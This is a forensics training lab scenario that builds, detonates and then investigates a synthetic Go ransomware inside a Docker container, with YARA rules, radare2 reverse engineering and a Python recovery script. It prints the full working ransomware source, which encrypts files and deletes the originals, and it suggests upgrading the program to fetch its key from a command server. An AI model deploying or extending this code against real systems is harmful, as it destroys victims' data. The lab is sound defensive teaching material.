# Scenario 3 — Container Ransomware Infection

> **Story.** A production microservice container starts throwing 500
> errors. The on-call engineer SSHs to the host and discovers files
> ending in `.locked` and a `README_RECOVER.txt` ransom note in
> `/data`. The container is paused — not killed — so the analyst can
> still inspect its memory and filesystem. **Investigate.**

**Modules used.** `malware-analysis` (yara, radare2, clamav),
`disk-forensics`, `memory-forensics`.

**Estimated demo time.** 50 minutes.

> ⚠️ The "ransomware" used here is a **synthetic, deliberately weak
> implementation** built into the lab (`fake-ransomware` written in
> Go). It uses real AES-256-GCM but a hard-coded key — recovery is
> trivial, which is the point. Do **not** repurpose this binary
> against real systems.

---

## 1. Lab setup

`docs/scenarios/labs/03-ransomware/`:

```
├── docker-compose.lab.yml
├── victim/
│   ├── Dockerfile               # production-ish microservice
│   ├── app.py                   # innocuous web service
│   └── data/                    # files that will get encrypted
└── ransom-builder/
    ├── Dockerfile
    └── ransomware.go            # the synthetic ransomware source
```

### 1.1 The victim service

`victim/Dockerfile`:

```dockerfile
FROM python:3.11-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
        curl ca-certificates procps \
 && rm -rf /var/lib/apt/lists/*

RUN useradd -r -u 1500 -m -s /bin/bash appsvc

WORKDIR /app
COPY app.py /app/
RUN pip install --no-cache-dir flask==3.0.3

# Stage some data that ransomware will eat
COPY data/ /data/
RUN chown -R appsvc:appsvc /data /app

USER appsvc
EXPOSE 5000
CMD ["python", "/app/app.py"]
```

`victim/app.py`:

```python
import os
import json
from datetime import datetime
from flask import Flask, jsonify

app = Flask(__name__)

@app.route("/")
def home():
    return jsonify({
        "service": "billing-api",
        "version": "2.4.1",
        "time":    datetime.utcnow().isoformat() + "Z",
    })

@app.route("/files")
def files():
    out = []
    for root, _, names in os.walk("/data"):
        for n in names:
            p = os.path.join(root, n)
            out.append({"path": p, "size": os.path.getsize(p)})
    return jsonify(out)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

`victim/data/` contents (anything realistic):

```bash
mkdir -p victim/data/{customers,invoices,reports}
echo '{"id":1,"name":"Acme Corp","balance":50000}' > victim/data/customers/c001.json
echo '{"id":2,"name":"Globex","balance":120000}'  > victim/data/customers/c002.json
echo "Invoice #2026-001\nTotal: \$5 000"          > victim/data/invoices/inv001.txt
echo "Q1 quarterly report — confidential"        > victim/data/reports/q1.txt
```

### 1.2 The ransomware source (`ransom-builder/ransomware.go`)

A small, single-file Go program. Real malware would obfuscate this
heavily; we want it readable so the reverse-engineering portion of
the lesson works.

```go
// fake-ransomware: a deliberately weak educational ransomware.
// DO NOT use against systems you do not own. The key is hardcoded.
package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "fmt"
    "io"
    "os"
    "path/filepath"
    "strings"
)

// Hard-coded key (would be C2-fetched in real malware).
var key = []byte("LabRansomwareKey32BytesLongTotal")
var marker = []byte("LOCKED!!")

const ransomNote = `============================================================
 YOUR FILES HAVE BEEN ENCRYPTED
============================================================

To recover your data, send 0.5 BTC to:
  bc1qxXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Email proof of payment to: lab-recovery@example.invalid
You have 72 hours.

Sample of encrypted files:
%s
============================================================
`

func encryptFile(path string) error {
    plain, err := os.ReadFile(path)
    if err != nil { return err }
    block, _ := aes.NewCipher(key)
    gcm, _ := cipher.NewGCM(block)
    nonce := make([]byte, gcm.NonceSize())
    io.ReadFull(rand.Reader, nonce)
    ct := gcm.Seal(nonce, nonce, plain, nil)
    out := append(marker, ct...)
    return os.WriteFile(path+".locked", out, 0644)
}

func main() {
    var encrypted []string
    target := "/data"
    if len(os.Args) > 1 { target = os.Args[1] }

    filepath.Walk(target, func(p string, info os.FileInfo, err error) error {
        if err != nil || info.IsDir() { return nil }
        if strings.HasSuffix(p, ".locked") { return nil }
        if err := encryptFile(p); err == nil {
            os.Remove(p)
            encrypted = append(encrypted, p+".locked")
        }
        return nil
    })

    note := fmt.Sprintf(ransomNote, strings.Join(encrypted, "\n"))
    os.WriteFile(target+"/README_RECOVER.txt", []byte(note), 0644)
    fmt.Printf("encrypted %d files\n", len(encrypted))
}
```

`ransom-builder/Dockerfile`:

```dockerfile
FROM golang:1.22-alpine AS build
WORKDIR /src
COPY ransomware.go .
RUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 \
    go build -ldflags="-s -w" -o /ransomware ransomware.go

FROM scratch AS export
COPY --from=build /ransomware /ransomware
```

Build the binary out:

```bash
cd docs/scenarios/labs/03-ransomware/ransom-builder
docker build --target export --output type=local,dest=. .
ls -la ransomware
# → ELF, ~3 MB, no symbols (-ldflags "-s -w" stripped them)
```

### 1.3 Compose

```yaml
services:
  victim:
    build: ./victim
    container_name: victim-billing
    hostname: billing-api
    networks:
      forensics-net:
        ipv4_address: 172.30.0.60
    ports:
      - "127.0.0.1:5050:5000"
    user: "1500:1500"             # not root by default
    cap_drop:
      - ALL
    cap_add:
      - DAC_OVERRIDE              # let appsvc read /data via os.walk
    security_opt:
      - no-new-privileges:true
    volumes:
      - victim-data:/data         # data lives in a volume
      - victim-logs:/var/log
    stdin_open: true
    tty: true

networks:
  forensics-net:
    name: forensics-net
    driver: bridge
    ipam:
      config:
        - subnet: 172.30.0.0/24

volumes:
  victim-data:
  victim-logs:
```

### 1.4 Bring it up & verify it's healthy

```bash
cd docs/scenarios/labs/03-ransomware
docker compose -f docker-compose.lab.yml up -d --build

# Confirm the service responds
curl -s http://127.0.0.1:5050/ | jq .
curl -s http://127.0.0.1:5050/files | jq '. | length'
# → 4 files
```

---

## 2. The attack

The premise: an attacker has already obtained code-execution inside
the container (initial access is out of scope for this scenario; assume
the SQLi from scenario 1 led to a RCE somewhere). They drop the
binary and run it.

### 2.1 Drop the ransomware

From the host:

```bash
docker cp ransom-builder/ransomware victim-billing:/tmp/ransomware
docker exec victim-billing chmod +x /tmp/ransomware
```

### 2.2 Detonate

```bash
docker exec victim-billing /tmp/ransomware /data
# → encrypted 4 files
```

### 2.3 Confirm the damage

```bash
docker exec victim-billing ls -la /data /data/customers /data/invoices /data/reports
# → originals gone, .locked replacements present, README_RECOVER.txt at /data/

curl -s http://127.0.0.1:5050/files | jq '.[] | .path'
```

### 2.4 Pause the container

Crucial detail: don't kill the container. Pausing keeps memory
pristine for analysis.

```bash
docker pause victim-billing
```

---

## 3. The investigation

### 3.1 Acquire artefacts

```bash
mkdir -p forensics-professional/evidence/case-03-ransomware/{filesystem,binary,memory}

# 3.1.1 — The encrypted filesystem
docker run --rm \
    --volumes-from victim-billing \
    -v "$PWD/forensics-professional/evidence/case-03-ransomware/filesystem":/out \
    alpine \
    sh -c 'cp -a /data /out/'

# 3.1.2 — The binary itself (still in /tmp)
docker run --rm --volumes-from victim-billing \
    -v "$PWD/forensics-professional/evidence/case-03-ransomware/binary":/out \
    alpine \
    sh -c 'cp /tmp/ransomware /out/'

# 3.1.3 — Memory dump (uses gcore on the python process)
# Note: requires SYS_PTRACE on the analyst container.
docker exec victim-billing sh -c 'apk add --no-cache gdb 2>/dev/null || true'
PID=$(docker exec victim-billing pgrep -f 'python /app/app.py' | head -1)
docker exec victim-billing gcore -o /tmp/billing-core "$PID" 2>/dev/null || \
    echo "(memory acquisition skipped — requires SYS_PTRACE)"

# Hash everything
cd forensics-professional/evidence/case-03-ransomware
find . -type f -exec sha256sum {} \; > ../case-03-ransomware.sha256
```

### 3.2 Inside the analyst container

```bash
cd forensics-professional
docker compose exec forensics bash
```

```bash
forensics-modules install malware-analysis --only yara,radare2,clamav -y
forensics-modules verify malware-analysis

mkdir -p /cases/case-03 && cd /cases/case-03

python3 - <<'PY'
from forensics.audit.logger import log_event
log_event("case_opened", {
    "case_id":  "INC-2026-003",
    "summary":  "Ransomware infection in billing-api container",
    "evidence": "/evidence/case-03-ransomware/",
}, user="sherlock")
PY
```

### 3.3 First look at the encrypted files

```bash
hexdump -C /evidence/case-03-ransomware/filesystem/data/customers/c001.json.locked \
  | head -3
# Notice 'LOCKED!!' at offset 0x00 → file marker
```

The first 8 bytes are an ASCII string `LOCKED!!`. That's an immediate
fingerprint we can hunt with.

```bash
# Hunt for that exact marker across the entire filesystem
grep -rl --include='*.locked' --binary 'LOCKED!!' \
    /evidence/case-03-ransomware/filesystem/data/
```

### 3.4 Read the ransom note

```bash
cat /evidence/case-03-ransomware/filesystem/data/README_RECOVER.txt
```

Capture the BTC wallet — it's an IoC.

### 3.5 Static analysis of the binary

```bash
BIN=/evidence/case-03-ransomware/binary/ransomware

file "$BIN"
# → ELF 64-bit LSB executable, x86-64, statically linked, stripped

sha256sum "$BIN"
# Record this hash as the IoC.

strings "$BIN" | grep -i 'lock\|ransom\|btc\|recover\|aes\|encrypt' | head -20
# → "LOCKED!!", "README_RECOVER.txt", "main.encryptFile"...
```

### 3.6 ClamAV scan

```bash
clamscan "$BIN"
# Likely clean — this is a brand-new binary.
# Real malware would already be in the signatures.
```

### 3.7 YARA rule, written from observations

```bash
mkdir -p /cases/case-03/yara
cat > /cases/case-03/yara/lab-ransomware.yar <<'EOF'
rule LabRansomware_v1 {
    meta:
        author      = "sherlock"
        date        = "2026-05-04"
        description = "Detects the synthetic lab ransomware (LOCKED!! marker)"
        family      = "lab-fake-ransomware"

    strings:
        $marker  = "LOCKED!!"
        $note1   = "YOUR FILES HAVE BEEN ENCRYPTED"
        $note2   = "README_RECOVER.txt"
        $func1   = "main.encryptFile"
        $bitcoin = /bc1[a-z0-9]{25,42}/

    condition:
        // Either an encrypted file (just the marker)…
        ($marker at 0)
        // …or the binary itself
        or (uint32(0) == 0x464c457f and 2 of ($note1, $note2, $func1, $bitcoin))
}
EOF

# Test it
yara /cases/case-03/yara/lab-ransomware.yar \
     /evidence/case-03-ransomware/binary/ransomware

yara -r /cases/case-03/yara/lab-ransomware.yar \
     /evidence/case-03-ransomware/filesystem/
```

### 3.8 Reverse engineering with radare2

```bash
r2 -A "$BIN"
```

In r2:

```
[0x00461080]> afl | grep -i encrypt
0x004afe60   76     4 main.encryptFile

[0x00461080]> s main.encryptFile
[0x004afe60]> pdf | head -60
# … reveals AES-GCM construction, hardcoded key from main.init

[0x004afe60]> izz | grep -i 'LabRansomware'
# → Hits the literal "LabRansomwareKey32BytesLongTotal"
[0x004afe60]> q
```

The 32-byte key is right there in plaintext. Real malware fetches the
key from C2 — the hardcoded key is what makes recovery possible in
this lab.

### 3.9 Write a recovery tool

```bash
cat > /cases/case-03/recover.py <<'EOF'
#!/usr/bin/env python3
"""Recover files encrypted by the lab fake-ransomware."""
import os, sys
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY    = b"LabRansomwareKey32BytesLongTotal"
MARKER = b"LOCKED!!"

def recover(path):
    with open(path, "rb") as f:
        data = f.read()
    if not data.startswith(MARKER):
        raise ValueError(f"{path}: missing marker")
    body = data[len(MARKER):]
    nonce, ct = body[:12], body[12:]
    plain = AESGCM(KEY).decrypt(nonce, ct, None)
    out = path[:-len(".locked")]   # drop the suffix
    with open(out, "wb") as f:
        f.write(plain)
    return out

if __name__ == "__main__":
    root = sys.argv[1]
    n = 0
    for dirpath, _, files in os.walk(root):
        for name in files:
            if name.endswith(".locked"):
                full = os.path.join(dirpath, name)
                try:
                    out = recover(full)
                    print(f"recovered: {out}")
                    n += 1
                except Exception as e:
                    print(f"FAIL {full}: {e}", file=sys.stderr)
    print(f"\n{n} files recovered")
EOF
chmod +x /cases/case-03/recover.py

# Try it on a copy (NEVER on originals)
cp -r /evidence/case-03-ransomware/filesystem /cases/case-03/recovery-copy
python3 /cases/case-03/recover.py /cases/case-03/recovery-copy/data/

# Verify
diff -r /cases/case-03/recovery-copy/data/customers/c001.json \
        <(echo '{"id":1,"name":"Acme Corp","balance":50000}')
```

### 3.10 Record the IoCs

```bash
python3 - <<'PY'
import hashlib
from forensics.audit.logger import log_event

with open("/evidence/case-03-ransomware/binary/ransomware", "rb") as f:
    bin_sha = hashlib.sha256(f.read()).hexdigest()

log_event("ioc_identified", {
    "case_id": "INC-2026-003",
    "ioc_type": "sha256",
    "value": bin_sha,
    "label": "ransomware binary",
}, user="sherlock")

log_event("ioc_identified", {
    "case_id": "INC-2026-003",
    "ioc_type": "file_marker",
    "value": "LOCKED!! (8 bytes at offset 0)",
    "label": "ransomware file marker",
})

log_event("ioc_identified", {
    "case_id": "INC-2026-003",
    "ioc_type": "wallet",
    "value": "bc1qxXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
    "label": "ransom wallet (lab placeholder)",
})

log_event("technique_identified", {
    "case_id": "INC-2026-003",
    "framework": "MITRE ATT&CK",
    "id": "T1486",
    "name": "Data Encrypted for Impact",
})

log_event("recovery_succeeded", {
    "case_id": "INC-2026-003",
    "method": "static AES-GCM key extracted from binary",
    "files_recovered": 4,
})
PY
```

### 3.11 Final report

```bash
mkdir -p /reports/INC-2026-003
cp /cases/case-03/yara/lab-ransomware.yar /reports/INC-2026-003/
cp /cases/case-03/recover.py /reports/INC-2026-003/
forensics-audit verify
forensics-audit export \
    --output /reports/INC-2026-003/audit-trail.jsonl --format jsonl
```

---

## 4. What to demo

1. **Marker hunting.** Grep the filesystem for `LOCKED!!` and find
   every encrypted file in seconds. Real cases need YARA, but the
   workflow is identical.
2. **Hard-coded keys are common.** Show the radare2 string view and
   point out `LabRansomwareKey...`. Many real ransomware families
   have leaked or weak keys (Wannacry, GandCrab decryptor, etc.).
3. **YARA rule generalises.** A 4-string YARA rule built from
   observations matches *both* the binary and the encrypted files.
   The same rule plugs into ClamAV with `clamscan -d`.
4. **Recovery is auditable.** The recovery script's success is logged
   in the audit chain — a future investigator can prove that data was
   recovered cleanly, when, and by whom.

---

## 5. Cleanup

```bash
docker unpause victim-billing 2>/dev/null || true
cd docs/scenarios/labs/03-ransomware
docker compose -f docker-compose.lab.yml down -v
rm -rf forensics-professional/evidence/case-03-ransomware
```

---

## 6. Extension exercises

- **Volatility.** If you successfully captured a memory dump, run
  `vol3 -f core.* linux.bash` and `vol3 -f core.* linux.psaux` against
  it. The shell history typically contains the attacker's wget/curl.
- **Better ransomware.** Modify `ransomware.go` so the key is fetched
  from a HTTP(S) C2 instead of hardcoded. Re-investigate. Now the
  static decryption pivot doesn't work — you need the C2 traffic.
  This shows why **memory acquisition** matters for modern ransomware.
- **Detection in production.** Add an inotify-based watchdog on `/data`
  that alerts when more than N files change extension to `.locked` in
  M seconds. This is how real EDRs catch ransomware at speed.
